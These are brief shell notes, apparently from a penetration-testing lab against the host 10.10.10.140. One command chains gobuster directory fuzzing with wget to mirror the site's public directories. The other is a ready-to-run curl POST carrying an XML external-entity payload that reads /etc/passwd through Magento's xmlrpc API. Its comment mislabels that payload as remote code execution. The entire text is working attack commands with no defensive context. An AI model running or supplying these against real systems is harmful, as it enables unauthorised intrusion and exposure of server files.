
# Fuzz + Clone public http directories on a site
# SITE = host with protocol ie http://10.10.10.140
# STATUS = directory get response status code
SITE="http://10.10.10.140" &&
  STATUS="301" &&
  gobuster dir -w /usr/share/SecLists-master/Discovery/Web-Content/big.txt -e -u $SITE |
  grep "Status: $STATUS" |
  grep -oP '(http:\/\/|https:\/\/)[^\s]*' |
  xargs wget -r -np -nH -R index.html

# Magento RCE Vuln exploits/19793
curl -X POST -d '<?xml version="1.0"?> <!DOCTYPE foo [  <!ELEMENT methodName ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall>  <methodName>&xxe;</methodName></methodCall>' http://10.10.10.140/index.php/api/xmlrpc
